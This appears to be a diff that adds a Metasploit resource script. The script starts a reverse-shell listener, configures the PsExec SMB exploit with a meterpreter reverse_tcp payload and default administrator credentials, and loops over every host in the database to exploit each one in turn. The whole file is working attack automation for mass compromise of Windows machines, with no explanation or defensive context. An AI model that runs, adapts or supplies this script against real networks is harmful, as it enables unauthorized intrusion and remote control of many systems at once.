@@ -1,0 +1,23 @@
+use multi/handler
+# Configure your handler
+set LHOST 192.168.0.24
+set LPORT 4444
+exploit -z -j
+
+#  Configure PSExec
+use windows/smb/psexec
+set payload windows/meterpreter/reverse_tcp
+set SMBUser administrator
+set SMBPass administrator
+set LHOST 192.168.0.24
+set LPORT 4444
+set DisablePayloadHandler true
+
+# Run against a class C
+<ruby>
+Msf::DBManager::Host.all.each do |host| 
+run_single("set RHOST #{host}") 
+run_single "exploit -z" 
+sleep 3
+end
+</ruby>
